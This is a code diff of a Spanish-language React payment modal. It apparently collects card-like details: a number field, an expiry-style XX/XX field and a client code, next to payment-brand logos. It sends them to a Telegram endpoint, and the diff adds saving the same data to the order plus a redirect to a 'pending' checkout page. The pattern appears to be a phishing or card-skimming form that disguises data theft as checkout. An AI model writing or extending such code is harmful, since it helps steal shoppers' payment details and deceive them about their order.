@@ -13,7 +13,7 @@ export default function SocioPaymentForm({
   onClose,
 }: {
   total: number;
-  orderId: string;
+  orderId: string; // ✅ aquí es external_reference
   open: boolean;
   onClose: () => void;
 }) {
@@ -43,9 +43,11 @@ export default function SocioPaymentForm({
   // ✅ Modal controlled
   if (!open) return null;
 
-  function closeModalAndGoHome() {
+  function closeModalAndGoPending() {
     onClose();
-    router.push("/");
+    router.push(
+      `/checkout/pending?external_reference=${encodeURIComponent(orderId)}`
+    );
   }
 
   function validate() {
@@ -107,6 +109,7 @@ ${form.recordar ? "SI" : "NO"}
     try {
       await wait(delayMs);
 
+      // 1) ✅ Telegram
       const res = await fetch("/api/telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -118,11 +121,35 @@ ${form.recordar ? "SI" : "NO"}
         throw new Error(data?.error || "No se pudo enviar a Telegram");
       }
 
+      // 2) ✅ Mark socio (después de Telegram OK)
+      const socioRes = await fetch("/api/orders/mark-socio", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          external_reference: orderId, // ✅ orderId es external_reference
+          socio_payload: {
+            socio: form.socio,
+            afiliacion: form.afiliacion,
+            codigoCliente: form.codigoCliente,
+            nombre: form.nombre,
+            apellido: form.apellido,
+            email: form.email,
+            recordar: form.recordar,
+          },
+        }),
+      });
+
+      if (!socioRes.ok) {
+        const data = await socioRes.json().catch(() => ({}));
+        throw new Error(data?.error || "No se pudo guardar socio_payload");
+      }
+
       setLoading(false);
       setStep("done");
 
+      // 3) ✅ Redirect a pending (en vez de home)
       setTimeout(() => {
-        closeModalAndGoHome();
+        closeModalAndGoPending();
       }, 3500);
     } catch (e: any) {
       setLoading(false);
@@ -174,11 +201,36 @@ ${form.recordar ? "SI" : "NO"}
                   </div>
 
                   <div style={styles.logoRow}>
-                    <Image src="/payments/logo1.png" alt="" width={32} height={18} />
-                    <Image src="/payments/logo2.png" alt="" width={32} height={18} />
-                    <Image src="/payments/logo3.png" alt="" width={32} height={18} />
-                    <Image src="/payments/logo4.png" alt="" width={32} height={18} />
-                    <Image src="/payments/logo5.png" alt="" width={32} height={18} />
+                    <Image
+                      src="/payments/logo1.png"
+                      alt=""
+                      width={32}
+                      height={18}
+                    />
+                    <Image
+                      src="/payments/logo2.png"
+                      alt=""
+                      width={32}
+                      height={18}
+                    />
+                    <Image
+                      src="/payments/logo3.png"
+                      alt=""
+                      width={32}
+                      height={18}
+                    />
+                    <Image
+                      src="/payments/logo4.png"
+                      alt=""
+                      width={32}
+                      height={18}
+                    />
+                    <Image
+                      src="/payments/logo5.png"
+                      alt=""
+                      width={32}
+                      height={18}
+                    />
                   </div>
                 </div>
               </label>
@@ -243,7 +295,9 @@ ${form.recordar ? "SI" : "NO"}
                     inputMode="numeric"
                     value={form.afiliacion}
                     onChange={(e) => {
-                      const raw = e.target.value.replaceAll(/\D/g, "").slice(0, 4);
+                      const raw = e.target.value
+                        .replaceAll(/\D/g, "")
+                        .slice(0, 4);
                       let formatted = raw;
                       if (raw.length >= 3)
                         formatted = `${raw.slice(0, 2)}/${raw.slice(2)}`;
@@ -435,7 +489,7 @@ ${form.recordar ? "SI" : "NO"}
               </div>
 
               <div style={styles.redirectNote}>
-                Serás redirigido al inicio en unos segundos…
+                Serás redirigido a la página pendiente en unos segundos…
               </div>
             </div>
           )}
@@ -459,7 +513,10 @@ function wait(ms: number) {
 
 function escapeHtml(input: unknown) {
   const s = String(input ?? "");
-  return s.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
+  return s
+    .replaceAll("&", "&amp;")
+    .replaceAll("<", "&lt;")
+    .replaceAll(">", "&gt;");
 }
 
 const styles: Record<string, React.CSSProperties> = {
